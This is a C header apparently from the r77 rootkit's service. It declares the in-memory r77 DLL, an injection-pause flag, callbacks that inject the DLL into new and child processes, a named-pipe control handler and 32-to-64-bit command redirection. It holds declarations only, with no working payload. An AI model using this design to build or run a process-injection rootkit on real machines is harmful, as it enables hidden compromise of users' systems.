#define CUSTOM_ENTRY
#include "r77mindef.h"

/// <summary>
/// The r77 DLL.
/// </summary>
LPBYTE Dll;
/// <summary>
/// The size of the r77 DLL.
/// </summary>
DWORD DllSize;
/// <summary>
/// Specifies whether to temporarily pause injection.
/// <para>This flag is related to the CONTROL_R77_PAUSE_INJECTION control code.</para>
/// </summary>
BOOL IsInjectionPaused;

/// <summary>
/// Callback for newly created child processes that should be injected.
/// </summary>
/// <param name="processId">The process ID of the new process.</param>
VOID ChildProcessCallback(DWORD processId);
/// <summary>
/// Callback for new processes that should be injected.
/// </summary>
/// <param name="processId">The process ID of the new process.</param>
VOID NewProcessCallback(DWORD processId);
/// <summary>
/// Callback for commands sent to the r77 service.
/// </summary>
/// <param name="controlCode">The control code of the command.</param>
/// <param name="pipe">A handle to the named pipe that contains data about the command.</param>
VOID ControlCallback(DWORD controlCode, HANDLE pipe);
/// <summary>
/// Redirects a command received by the 32-bit r77 service to the 64-bit r77 service.
/// </summary>
/// <param name="controlCode">The control code to redirect.</param>
/// <param name="data">A buffer with the data to write to the pipe, or NULL if only the control code needs to be written.</param>
/// <param name="size">The size of the data to write to the pipe, or 0 if only the control code needs to be written..</param>
VOID RedirectCommand64(DWORD controlCode, LPVOID data, DWORD size);